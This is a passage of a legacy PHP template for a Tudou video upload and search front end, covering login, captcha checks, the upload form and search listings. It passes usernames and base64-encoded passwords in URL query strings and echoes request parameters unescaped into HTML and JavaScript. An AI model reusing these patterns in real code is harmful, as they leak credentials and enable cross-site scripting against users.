                        <?php echo "<a style=\"\" href=\"".ScriptPath()."?api=live&action=".encodeuri("account.list")."&authdata=".encodeuri(trim(request("authdata")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=1&skin=".$skincolor."&domainname=".encodeuri($domainname)."\">".$mediatags."</a>";?>
                </td>
                <td align="center" style="<?php $i%4==3?$style->selcolor($skincolor,'tdbg'):'';?>" style="<?php $i%4==3?$style->selcolor($skincolor,'tdbg'):'';?>" onmouseover="this.style.backgroundColor='#f9f9f9';" onmouseout="this.style.backgroundColor='';" onmousedown="this.style.backgroundColor='';">
                        <?php echo $mediaownername."(".$mediaownernickname."/".$mediaownerid.")";?>
                </td>
                <td align="center" style="<?php $i%4==3?$style->selcolor($skincolor,'tdbg'):'';?>" onmouseover="this.style.backgroundColor='#f9f9f9';" onmouseout="this.style.backgroundColor='';" onmousedown="this.style.backgroundColor='';">
                        <?php echo "<a style=\"\" href=\"".ScriptPath()."?api=live&action=".encodeuri("account.create")."&authdata=".encodeuri(trim(request("authdata")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&domainname=".encodeuri($domainname)."\">收藏</a>";?> <?php echo "<a style=\"\" href=\"".ScriptPath()."?api=live&action=".encodeuri("account.create")."&authdata=".encodeuri(trim(request("authdata")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&domainname=".encodeuri($domainname)."\">网收</a>";?>
                </td>
        </tr>   
                	<?php 
                }
                ?>
                </td>
        </tr>           
</table>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center" colspan="3" height="30"  style="<?php $i%4==3?$style->selcolor($skincolor,'tdtbg'):'';?>"> 共 <?php  echo $totalpage;?> 页 第  
                <?php 
                echo $page." 页 ".$sCrLf;
                if (floor($page)>1)
                        echo "<a style='' href='".httppath()."?api=tudou&action=".encodeuri(trim(request('action')))."&pagesize=".encodeuri($pagesize)."&page=".($page-1)."&skin=".$skincolor."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."'>上一页</a> ";
                if (floor($page)>0 && floor($page)<floor($totalpage))
                        echo "<a style='' href='".httppath()."?api=tudou&action=".encodeuri(trim(request('action')))."&pagesize=".encodeuri($pagesize)."&page=".($page+1)."&skin=".$skincolor."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."'>下一页</a> ";
                				?>
                				<input name="page" class='input' border="0" value="<?php  echo $page; ?>" style="height:20px;width:40px;font-size:11px;text-align:center;" <?php  $style->input("#f9f9f9",""); ?>>
												<input type="submit" style="<?php $style->selcolor($skincolor,'tdtbg');?>" class="button" name="gotopage" value=" Go ">                 
                				<?php 
                //$gotopage = New PageChange();
                //$gotopage->CallPageChange();
                ?>
                </td>
        </tr>   
</table>
<?php 
                //$gotopage->gotopage($totalpage,httppath()."?api=tudou&action=".encodeuri(trim(request('action')))."&pagesize=".encodeuri($pagesize)."&skin=".$skincolor."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&gopage=ok&page=","X3193","请在空白处输入要转到的页数");
                break;
        case "media.user":
                if (trim(request("logout")) != ""){
                        session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                        session_register("tudou");
}
                        $_SESSION["tudou"] = array('uname' => '', 'pwd' => '');                 
                        redirect(scriptpath()."?api=tudou&skin=".$skincolor."&uname=&pwd=&action=".encodeuri(trim(request("action"))));
                        break;
                }
                elseif ($_SESSION["tudou"]["uname"] != "" && $_SESSION["tudou"]["pwd"] != "" && trim(request("uname")) == "" && trim(request("pwd")) == ""){
                        redirect(scriptpath()."?api=tudou&skin=".$skincolor."&uname=".encodeuri(base64_encode(trim($_SESSION["tudou"]["uname"])))."&pwd=".encodeuri(base64_encode(trim($_SESSION["tudou"]["pwd"])))."&action=".trim(request("action"))."&checkcode=".trim(request("checkcode")));
                        break;
                }               
                elseif (trim($_POST["uname"]) != "" && trim($_POST["pwd"]) != ""){
                        If ($_SESSION['ValidCode'] != "" && $_SESSION['ValidCode'] != trim(request("checkcode"))){
                                if (trim(request("checkcode")) != ""){
                                			if(!is_wap()){
                                        AlertBack("四位验证码错误！" , 1);
                                        break;
                                      }  
                                      else{ 
                                    	?>

<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>           

        <tr class="tdbg">
                <td align="center" id="result">
											四位验证码错误！
											<a hreF='#' onclick='window.location.href="<?php echo trim(request("refer"))?>";'>返回</a>
                </td>
        </tr>  
</table> 
																			<?php 
                        								break;
                                      }
                                }       
                                elseif (trim(request("checkcode")) == ""){
                                			if(!is_wap()){
                                        AlertBack("四位验证码错误！" , 1);
                                        break;
                                      }  
                                      else{ 
                                    	?>

<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>           

        <tr class="tdbg">
                <td align="center" id="result">
											四位验证码为空！
											<a hreF='#' onclick='window.location.href="<?php echo trim(request("refer"))?>";'>返回</a>
                </td>
        </tr>  
</table> 
																			<?php 
                        								break;
                                      }
                               }               
                        }

                        
                        session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                        session_register("tudou");
}
                        $_SESSION["tudou"]=array('uname' => base64_decode(trim(request("uname"))), 'pwd' => base64_decode(trim(request("pwd"))));
                        redirect(scriptpath()."?api=tudou&skin=".$skincolor."&uname=".encodeuri(Base64_encode(trim($_POST["uname"])))."&pwd=".encodeuri(Base64_encode(trim($_POST["pwd"])))."&action=".encodeuri(trim(request("action")))."&checkcode=".trim(request("checkcode")));
                        break;
                }       
                elseif (trim(request("uname")) == "" || trim(request("pwd")) == ""){
                        redirect(scriptpath()."?api=tudou&skin=".$skincolor."&uname=&pwd=&action=".encodeuri('media.login')."&checkcode=".trim(request("checkcode")));
                        break;
                }
               	$tudou_media = new tudou_class();
                //print_r($mediaulist);
                break;
        case "media.create":
                if (trim(request("logout")) != ""){
                        session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                        session_register("tudou");
}
                        $_SESSION["tudou"] = array('uname' => '', 'pwd' => '');                 
                        redirect(scriptpath()."?api=tudou&skin=".$skincolor."&uname=&pwd=&action=".encodeuri(trim(request("action"))));
                        break;
                }
                elseif ($_SESSION["tudou"]["uname"] != "" && $_SESSION["tudou"]["pwd"] != "" && trim(request("uname")) == "" && trim(request("pwd")) == ""){
                        redirect(scriptpath()."?api=tudou&skin=".$skincolor."&uname=".encodeuri(trim($_SESSION["tudou"]["uname"]))."&pwd=".encodeuri(trim($_SESSION["tudou"]["pwd"]))."&action=".trim(request("action"))."&checkcode=".trim(request("checkcode")));
                        break;
                }               
                elseif (trim($_POST["uname"]) != "" && trim($_POST["pwd"]) != ""){
                        If ($_SESSION['ValidCode'] != "" && $_SESSION['ValidCode'] != trim(request("checkcode"))){
                                if (trim(request("checkcode")) != ""){
                                			if(!is_wap()){
                                        AlertBack("四位验证码错误！" , 1);
                                        break;
                                      }  
                                      else{
                                    	?>

<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center" height="30"  style="<?php $style->selcolor($skincolor,'tdtbg');?>"> 操 作 结 果 </td>
        </tr>           

        <tr class="tdbg">
                <td align="center" id="result" style="<?php $style->selcolor($skincolor,'tdbg');?>">
											四位验证码错误！
											<a hreF='#' onclick='window.location.href="<?php echo trim(request("refer"))?>";'>返回</a>
                </td>
        </tr>  
</table> 
																			<?php 
                        								break;
                                      }
                                }       
                                elseif (trim(request("checkcode")) == ""){
                                        AlertBack("四位验证码为空！" , 1);
                                        break;
                                }               
                        }

                        
                        session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                        session_register("tudou");
}
                        $_SESSION["tudou"]=array('uname' => base64_encode(trim(request("uname"))), 'pwd' => base64_encode(trim(request("pwd"))));
                        redirect(scriptpath()."?api=tudou&skin=".$skincolor."&uname=".encodeuri(Base64_encode(trim($_POST["uname"])))."&pwd=".encodeuri(Base64_encode(trim($_POST["pwd"])))."&action=".trim(request("action"))."&checkcode=".trim(request("checkcode")));
                        break;
                }       
                elseif (trim(request("uname")) == "" || trim(request("pwd")) == ""){
                        redirect(scriptpath()."?api=tudou&skin=".$skincolor."&uname=&pwd=&action=".encodeuri('media.login')."&checkcode=".trim(request("checkcode")));
                        break;
                }               

        	if (trim(request("mediapath")) == "" && !is_uploaded_file($_FILES['mediapath']['tmp_name'])){
                	?>
<script>
function changeimg()
{
 document.getElementById("ccimg").src = '<?php echo ScriptPath();?>?api=checkcode&a=' + Math.random();
}
</script>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="left" colspan="3" width="100%" height="30" style="<?php $style->selcolor($skincolor,'tdbg');?>"> [ <a style="" href="<?php echo ScriptPath()."?api=tudou&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&skin=".$skincolor."&action=".encodeuri(trim('media.ulist'))."&u=".encodeuri(trim(request("u")))."&t=".encodeuri(trim(request("t")))."&c=".encodeuri(trim(request("c")))?>" target=_self>用户</a> - <?php echo Base64_decode(trim($_SESSION["tudou"]["uname"]));?> <?php  if (trim($_SESSION["tudou"]["uname"]) != "" && trim($_SESSION["tudou"]["pwd"]) != "") {?> - <a style="color:#444444;"href="<?php echo scriptpath()."?api=tudou&skin=".$skincolor."&uname=".encodeuri(Base64_encode(trim(request("uname"))))."&pwd=".encodeuri(Base64_encode(trim(request("uname"))))."&action=".encodeuri(trim(request("action")))."&urlflag=1&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&logout=1";?>" target="_self">退出</a><?php  } ?> ] </td>
        </tr>
</table>

<table width="95%" height="70" align="center" valign="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <form enctype="multipart/form-data" action="<?php echo ScriptPath();?>?api=tudou&action=<?php echo encodeuri("media.create")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&skin=".$skincolor;?>&refer=<?php echo encodeuri(trim($_SERVER['HTTP_REFERER']));?>&classid=<?php echo trim(request("calssid"));?>&post=1" method="POST" name="tudou">
        <tr>
                <td align="center">
                        <input class="input" border="0" <?php  $style->input("#f9f9f9","","mediatitle");?> style="width:200px;height:30px;" type="text" name="mediatitle" id="mediatitle" value="标题" onmouseover="document.getElementById('mediatitle').value='';" />

                      <input class="input" border="0" <?php  $style->input("#f9f9f9","","mediatags");?> style="width:150px;height:30px;" type="text" name="mediatags" id="mediatags" value="关键词" /></textarea>
             
                        <SELECT name="mediaclassid" class="sotoolbar select" border="0" size="1" <?php  $style->selectarea("#f9f9f9",""); ?> style="height:<?php echo browser()=='ie'?'20px':'30px'?>;width:75px;font-size:12px">
                        <?php 
                        $tudou_media = new tudou_class();
	          	$mediaclassid = $tudou_media->tudoumediaclassid();
			?>
                        <?php 
	          	//print_r($mediaclassid);
                        for($i = 0; $i < count($mediaclassid);$i++){
                        ?>
                                <OPTION class="option" style="height:<?php echo browser()=='ie'?'20px':'30px'?>;background-color: <?php echo $i%2==0? '#ffffff':'';?>;" VALUE="<?php  echo $mediaclassid[$i]['code'];?>" <?php  if (trim(request('mediaclassid')) == $mediaclassid[$i]['code']) echo 'selected';?>><?php  echo $mediaclassid[$i]['type'];?></OPTION>
                        <?php 
                        }
                        ?>
                        </SELECT> 
									
                        <input class="input" border="0" <?php  $style->input("#f9f9f9","","checkcode");?> style="width:80px;height:30px" type="text" maxlength="4" id="checkcode" name="checkcode" maxlength="11" onKeyUp="value=value.replace(/[^0-9a-zA-Z,]/g,'')" value="验证码" />
                        &nbsp;<a href="javascript:changeimg()" title="看不清楚？换一个！"><IMG id="ccimg" height="15" src="<?php echo ScriptPath();?>?api=checkcode" border="0"></a>

											<?php
											if(is_wap()){
											?>
                      <input style="width:150px;height:30px;" type="file" name="mediapath" id="mediapath" />
											<?php
											}else{
											?>
                      <input style="width:150px;height:30px;display:none" type="file" name="mediapath" id="mediapath" />	
											<input class="sotoolbar button" border="0" <?php  $style->input("#f9f9f9","");?> style="width:50px;height:30px;<?php $style->selcolor($skincolor,'tdbg');?>"
											 type="button" id='fileup' onclick='javascript:document.getElementById("mediapath").click()' value="文件" />
											<?php
											}
											?>	
											
                        <input border="0" class="sotoolbar button" name="btnSubmit" style="width:<?php echo browser()=='ie'?'60px':'100px'?>;height:<?php echo browser()=='ie'?'20px':'30px'?>;<?php $style->selcolor($skincolor,'tdbg');?>" <?php  $style->input("#f9f9f9","");?> id=bsubmit value="上传视频" type="submit" />
                </td>                
        </tr>
</table>
</form>
<table style="width:95%;height:300px;" align="center" valign="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr>
      	
                <td align="center" class="tdbg" valign='middle'  style="<?php $style->selcolor($skincolor,'tdtbg');?>">
                      <textarea class="textarea" border="0" <?php  $style->textarea("#f9f9f9","","mediacontent");?> style="width:100%;height:100%;" type="text" name="mediacontent" id="mediacontent" value="" rows="20" cols="80" />视频介绍</textarea>         
                </td>  
<script src="//cdn.ckeditor.com/4.5.9/full/ckeditor.js"></script>
            <script>
                // Replace the <textarea id="editor1"> with a CKEditor
                // instance, using default configuration.
                CKEDITOR.replace( 'mediacontent' );
            </script>                        	
        </tr>        
</table>

                	<?php 
                }
        	elseif (trim($_GET["post"]) != ""){
                        If ($_SESSION['ValidCode'] != "" && $_SESSION['ValidCode'] != trim(request("checkcode"))){
                                if (trim(request("checkcode")) != ""){
                                			if(!is_wap()){
                                        AlertBack("四位验证码错误！" , 1);
                                        break;
                                      }  
                                      else{
                                    	?>

<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>           

        <tr class="tdbg">
                <td align="center" id="result">
											四位验证码错误！
											<a hreF='#' onclick='window.location.href="<?php echo trim(request("refer"))?>";'>返回</a>
                </td>
        </tr>  
</table> 
																			<?php 
                        								break;
                                      }
                                }       
                                elseif (trim(request("checkcode")) == ""){
                                        AlertBack("四位验证码为空！" , 1);
                                        break;
                                }               
                        }


									$content = trim(request("mediacontent"));	
									$tags = trim(request("mediatags"));	
									$title = trim(request("mediatitle"));	
									$channelId = trim(request("mediaclassid"));
									$tudou_media = new tudou_class();
               		$mediaupload = $tudou_media->tudoumediaupload(base64_decode($_SESSION["tudou"]["uname"]),base64_decode($_SESSION["tudou"]["pwd"]),$content,$tags,$title,$channelId,$_FILES);

						$timeout = "5000";
		                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center" height="30" > 操 作 结 果 </td>
        </tr>           
                		<?php 
                		if ($mediaupload['result'] != 'ok' && $mediaupload['content'] != 'ok'){
                			   if(!is_wap()){
                		?>
        <tr class="tdbg">
                <td align="center" id="result" height="30" >
                        视频上传失败！<?php echo ($timeout/1000)?> 秒后返回上一页
                </td>
        </tr>   
                		<?php       
                        		echo "<p align=center><script>window.setTimeout(\"history.go(-1)\",".$timeout.");</script></p>";                                
                        		break;
                        	}
                        	else{
                		?>
        <tr class="tdbg">
                <td align="center" id="result" height="30" >
                        视频上传失败！<?php echo ($timeout/1000)?> <a href="<?php  echo trim(request("refer"))?>">返回上一页</a>
                </td>
        </tr>   
                		<?php  
                        	}
                		}
                		elseif ($mediaupload['result'] == 'ok' && $mediaupload['content'] == 'ok'){
                			   if(!is_wap()){                			
                		?>
        <tr class="tdbg">
                <td align="center" id="result" height="30" >
                        视频上传成功！<?php echo ($timeout/1000)?> 秒后返回上一页
                </td>
        </tr>   
                        		<?php       
                        		echo "<p align=center><script>window.setTimeout(\"history.go(-1)\",".$timeout.");</script></p>";                                
                        	}
                        	else{
                		?>
        <tr class="tdbg">
                <td align="center" id="result" height="30" >
                        视频上传成功！<?php echo ($timeout/1000)?> <a href="<?php  echo trim(request("refer"))?>">返回上一页</a>
                </td>
        </tr>   
                		<?php  
                        	}                
                		}       
                		?>
</table>                        
                		<?php               
                }
                break;
        case "media.search":
								//redirect(scriptpath()."?api=tudou&skin=".$skincolor."&uname=".encodeuri(base64_encode(trim($_SESSION["tudou"]["uname"])))."&pwd=".encodeuri(base64_encode(trim($_SESSION["tudou"]["pwd"])))."&action=".encodeuri(trim("media.ulist"))."&checkcode=".trim(request("checkcode")));        				
        				//EXIT;
                if (trim(request("logout")) != ""){
                        session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                        session_register("tudou");
}
                        $_SESSION["tudou"] = array('uname' => '', 'pwd' => '');                 
                        redirect(scriptpath()."?api=tudou&skin=".$skincolor."&uname=&pwd=&action=".encodeuri(trim(request("action"))));
                        break;
                }        
        		if(trim($_GET['keyword']) != '' ){
                                //redirect(httppath()."?api=tudou&action=".encodeuri('media.search')."&keyword=".encodeuri(trim(request('keyword')))."&mediaclassid=".encodeuri(trim(request('mediaclassid')))."&pagesize=".encodeuri($pagesize)."&page=".encodeuri($page)."&skin=".$skincolor."&mediaday=".encodeuri(Trim(request('mediaday')))."&mediatime=".encodeuri(Trim(request('mediatime')))."&mediatype=".encodeuri(Trim(request('mediatype')))."&mediaorder=".encodeuri(Trim(request('mediaorder'))));
        		}
        		?>
<script>
function changeimg()
{
 document.getElementById("ccimg").src = '<?php echo ScriptPath();?>?api=checkcode&a=' + Math.random();
}
</script>
        	      <form action="<?php echo ScriptPath();?>" method="get" name="tudou">
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr>
                <td align="center" height="60" class="" valign="middle">
                        <input type="hidden" class="text" name="api" value="tudou" size="1"> 
                        <input type="hidden" class="text" name="action" value="<?php echo encodeuri('media.search');?>" size="1">      <input name="keyword" class='input' border="0" value="<?php  echo trim(request("keyword")); ?>" style="height:<?php echo browser()=='ie'?'20px':'30px'?>;width:90px;font-size:11px;text-align:center;" <?php  $style->input("#f9f9f9",""); ?>>
                        <SELECT name="mediaclassid" class="sotoolbar select" border="0" size="1" <?php  $style->selectarea("#f9f9f9",""); ?> style="height:<?php echo browser()=='ie'?'20px':'30px'?>;width:75px;font-size:12px">
                        <?php 
                        $tudou_media = new tudou_class();
	          	$mediaclassid = $tudou_media->tudoumediaclassid();
			?>
                        <?php 
	          	//print_r($mediaclassid);
                        for($i = 0; $i < count($mediaclassid);$i++){
                        ?>
                                <OPTION class="option" style="height:<?php echo browser()=='ie'?'20px':'30px'?>;background-color: <?php echo $i%2==0? '#ffffff':'';?>;" VALUE="<?php  echo $mediaclassid[$i]['code'];?>" <?php  if (trim(request('mediaclassid')) == $mediaclassid[$i]['code']) echo 'selected';?>><?php  echo $mediaclassid[$i]['type'];?></OPTION>
                        <?php 
                        }
                        ?>
                        </SELECT>

                        <SELECT name="mediaday" class="sotoolbar select" border="0" size="1" <?php  $style->selectarea("#f9f9f9",""); ?> style="width:75px;height:<?php echo browser()=='ie'?'20px':'30px'?>;font-size:12px">
                        <?php 
                        $tudou_media = new tudou_class();
	          	$mediaday = $tudou_media->tudoumediaday();
			?>

                        <?php 
                        for($i = 0; $i < count($mediaday);$i++){
                        ?>
                                <OPTION class="option" style="height:<?php echo browser()=='ie'?'20px':'30px'?>;background-color: <?php echo $i%2==0? '#ffffff':'';?>;" VALUE="<?php  echo $mediaday[$i]['day'];?>" <?php  if (trim(request('mediaday')) == $mediaday[$i]['day']) echo 'selected';?>><?php  echo $mediaday[$i]['name'];?></OPTION>
                        <?php 
                        }
                        ?>
                        </SELECT>

                        <SELECT name="mediatime" class="sotoolbar select" border="0" size="1" <?php  $style->selectarea("#f9f9f9",""); ?> style="width:75px;height:<?php echo browser()=='ie'?'20px':'30px'?>;font-size:12px">
                        <?php 
                        $tudou_media = new tudou_class();
	          	$mediatime = $tudou_media->tudoumediatime();
			?>

                        <?php 
                        for($i = 0; $i < count($mediatime);$i++){
                        ?>
                                <OPTION class="option" style="height:<?php echo browser()=='ie'?'20px':'30px'?>;background-color: <?php echo $i%2==0? '#ffffff':'';?>;" VALUE="<?php  echo $mediatime[$i]['time'];?>" <?php  if (trim(request('mediatime')) == $mediatime[$i]['time']) echo 'selected';?>><?php  echo $mediatime[$i]['name'];?></OPTION>
                        <?php 
                        }
                        ?>
                        </SELECT>

                        <SELECT name="mediatype" class="sotoolbar select" border="0" size="1" <?php  $style->selectarea("#f9f9f9",""); ?> style="width:75px;height:<?php echo browser()=='ie'?'20px':'30px'?>;font-size:12px">
                        <?php 
                        $tudou_media = new tudou_class();
	          	$mediatype = $tudou_media->tudoumediatype();
			?>
                        <?php 
                        for($i = 0; $i < count($mediatype);$i++){
                        ?>
                                <OPTION class="option" style="height:<?php echo browser()=='ie'?'20px':'30px'?>;background-color: <?php echo $i%2==0? '#ffffff':'';?>;" VALUE="<?php  echo $mediatype[$i]['type'];?>" <?php  if (trim(request('mediatype')) == $mediatype[$i]['type']) echo 'selected';?>><?php  echo $mediatype[$i]['name'];?></OPTION>
                        <?php 
                        }
                        ?>
                        </SELECT>

                        <SELECT name="mediaorder" class="sotoolbar select" border="0" size="1" <?php  $style->selectarea("#f9f9f9",""); ?> style="width:75px;height:<?php echo browser()=='ie'?'20px':'30px'?>;font-size:12px">
                        <?php 
                        $tudou_media = new tudou_class();
	          	$mediaorder = $tudou_media->tudoumediaorder();
			?>
                        <?php 
                        for($i = 0; $i < count($mediaorder);$i++){
                        ?>
                                <OPTION class="option" style="height:<?php echo browser()=='ie'?'20px':'30px'?>;background-color: <?php echo $i%2==0? '#ffffff':'';?>;" VALUE="<?php  echo $mediaorder[$i]['order'];?>" <?php  if (trim(request('mediaorder')) == $mediaorder[$i]['order']) echo 'selected';?>><?php  echo $mediaorder[$i]['name'];?></OPTION>
                        <?php 
                        }
                        ?>
                        </SELECT>

                        <input type="text" class='input' border="0" name="pagesize" value="<?php echo $pagesize?>" style="width:30px;height:<?php echo browser()=='ie'?'20px':'30px'?>;font-size:12px;text-align:center;" <?php  $style->input("#f9f9f9","") ?>>
                        <input type="hidden" class="text" name="skin" value="<?php echo $skincolor;?>" size="1"> 
                        <input type="hidden" class="text" name="page" value="<?php echo $page;?>" size="1">                      
                        <input type="submit" class="button" name="btnSubmit" value=" Go " style="width:<?php echo browser()=='ie'?'60px':'100px'?>;height:<?php echo browser()=='ie'?'20px':'30px'?>;<?php $style->selcolor($skincolor,'tdtbg');?>">
                        <?php 
                      	if($_SESSION["tudou"]["uname"] != '' && $_SESSION["tudou"]["pwd"] != ''){
                      	?>
                        &nbsp;<a style="" href="<?php echo ScriptPath()."?api=tudou&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri(trim($_SESSION["tudou"]["uname"]))."&pwd=".encodeuri(trim($_SESSION["tudou"]["pwd"]))."&skin=".$skincolor."&action=".encodeuri(trim('media.ulist'))."&u=".encodeuri(trim(request("u")))."&t=".encodeuri(trim(request("t")))."&c=".encodeuri(trim(request("c")))?>" target=_self>用户</a>
                      	<?php 	
                      	}	
                        else{
                        ?>
                        &nbsp;<a  style="" href="?api=tudou&action=<?php echo encodeuri('media.login');?>&skin=<?php echo $skincolor;?>" title="上传视频到土豆服务器">登入</a>
                        <?php 
                      	}
                        ?>
                </td>
        </tr>   
</table>
<table width="95%" height="3" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF">
        <tr>
                <td align="left">
                        
                </td>
        </tr>   
</table>
	  <?php 
	  	if(trim(request('keyword')) != ''){
                	$tudou_media = new tudou_class();
                	$medialist = $tudou_media->tudoumedialist(trim(request('keyword')),trim(request('mediaorder')),trim(request('page')),trim(request('pagesize')),trim(request('mediatype')),trim(request('mediatime')),trim(request('mediaday')),trim(request('mediaclassid')));
               		//print_r($medialist);
               		//return;
               		$strpagesize = $medialist['itemcount'];
	              	//if ($medialist['length'] > $pagesize) $strpagesize = $pagesize; else $strpagesize = $medialist['length'];
	              	if($medialist['forbidflag']=='1'||$medialist['closeflag'] == '1'||$medialist['itemcount']=='0'){
										?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center" colspan="3" height="30"  style="<?php $style->selcolor($skincolor,'tdtbg');?>"> 查 询 结 果 </td>
        </tr>
</table>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
<form name="tudou" method="POST" action="">
        <tr class="tdbg">
                <td align="center" width=100% height="30"  style="<?php $style->selcolor($skincolor,'tdbg');?>">
										未搜索到任何相关内容！
                </td>   
        </tr>
</table>								
										<?php 	              	
	              	}
	              	else{
                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center" colspan="3" height="30"  style="<?php $style->selcolor($skincolor,'tdtbg');?>"> 查 询 结 果 : 共 <?php echo $medialist['length'];?> 条 </td>
        </tr>
</table>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
<form name="live" method="POST" action="">
                <?php 
                $totalitem = $medialist['length'];
                if (fmod($totalitem, $pagesize) == 0){
                        $totalpage=$totalitem/$pagesize;
                }       
                else{
                        $totalpage=ceil($totalitem/$pagesize);
                }       
                if ($totalpage == $page)
                        $endid = $totalitem-1;
                elseif ($totalpage > $page)
                        $endid = floor($strpagesize*($page)-1);
                elseif ($totalpage < $page){
                        $endid = floor($strpagesize*($page-1)-1);
                }                       
                ?>
        <tr class="tdbg" height="30" >
        	      <td align="center" width=4% style="<?php $style->selcolor($skincolor,'tdbg');?>">
                        序号
                </td>
                <td align="center" width=80% style="<?php $style->selcolor($skincolor,'tdbg');?>">
                        标题
                </td>
                <td align="center" width=16% style="<?php $style->selcolor($skincolor,'tdbg');?>">
                        搜索 可用 无效 满载
                </td> 
        </tr>
                <?php 
                for($i = 0; $i < $strpagesize; $i++){
                        $mediatitle = $medialist[$i]['mediatitle'];//iconv('utf-8','gb2312',$objHdd->getElementsByTagName('domainName')->item(0)->nodeValue);
                        $mediatags = $medialist[$i]['mediatags'];//iconv('utf-8','gb2312',$objHdd->getElementsByTagName('active')->item(0)->nodeValue);
                        $mediaownername = $medialist[$i]['mediaownername'];//iconv('utf-8','gb2312',$objHdd->getElementsByTagName('numUsers')->item(0)->nodeValue);
                        $mediaownernickname = $medialist[$i]['mediaownernickname'];//iconv('utf-8','gb2312',$objHdd->getElementsByTagName('maxUsers')->item(0)->nodeValue);
                        $mediaownerid = $medialist[$i]['mediaownerid'];//iconv('utf-8','gb2312',$objHdd->getElementsByTagName('maxUsers')->item(0)->nodeValue);
                        $mediaplayerurl = $medialist[$i]['mediaplayerurl'];
                        $mediaitemurl = $medialist[$i]['mediaitemurl'];
                        $mediatype = $medialist[$i]['mediatype'];
                        $mediadescription = $medialist[$i]['mediadescription'];
                        $mediapicurl = $medialist[$i]['mediapicurl'];
                        $mediatime = $medialist[$i]['mediatime'];
                        $mediacreatetime = $medialist[$i]['mediacreatetime'];
                        $mediaclass = $medialist[$i]['mediaclass'];
                        $mediachecked = $medialist[$i]['mediachecked'];
                        $mediaitemcode = $medialist[$i]['itemCode'];

                        ?>
        <tr class="<?php echo $i%4==3?'tdbg':'';?>" height="30" onmouseover="this.style.backgroundColor='#f9f9f9';" onmouseout="this.style.backgroundColor='';" onmousedown="this.style.backgroundColor='';"> 
                <td align="center" style="<?php $i%4==3?$style->selcolor($skincolor,'tdbg'):'';?>">
                        <?php echo $i+1;?>
                </td>        	
                <td align="left" style="<?php $i%4==3?$style->selcolor($skincolor,'tdbg'):'';?>">
                <?php 
                        $tudou_media = new tudou_class();
               		$mediaviewer = $tudou_media->tudouviewer();
               		if($mediaviewer){
                ?>
                        <?php echo "<a style=\"\" title='".($mediaitemurl)." ".$sCrLf.$mediatitle." ".$sCrLf.($mediadescript).$sCrLf.$mediacreatetime."' href=\"http://www.tudou.com/v/".trim($mediaitemcode)."/&cbs=2&vbc=9&autoPlay=true/v.swf\" target=\"_blank\">".trim($mediatitle)."</a>";?>
                <?php 
			}
               		else{
                ?>
